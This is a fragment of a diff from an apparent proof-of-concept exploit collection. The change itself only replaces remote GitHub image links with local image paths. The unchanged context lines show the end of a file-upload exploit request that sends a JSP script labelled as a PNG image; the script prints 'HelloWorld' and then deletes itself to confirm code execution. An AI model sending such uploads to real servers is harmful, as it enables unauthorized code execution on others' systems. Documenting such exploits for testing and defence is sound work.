@@ -32,6 +32,6 @@ Content-Type: image/png
 <% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 ------WebKitFormBoundarygcflwtei--
 ```
-![a10d70f9a0848a20dd6ebc0f5f6990de](https://github.com/wy876/POC/assets/139549762/2478f8a3-cabf-46a8-abed-721fd81d9d81)
+![a10d70f9a0848a20dd6ebc0f5f6990de](../../images/2478f8a3-cabf-46a8-abed-721fd81d9d81.png)
 
-![4d05607351d88cb56932ae7a9c7bf399](https://github.com/wy876/POC/assets/139549762/de06459c-ad80-4711-8242-eaab2c6b2881)
+![4d05607351d88cb56932ae7a9c7bf399](../../images/de06459c-ad80-4711-8242-eaab2c6b2881.png)
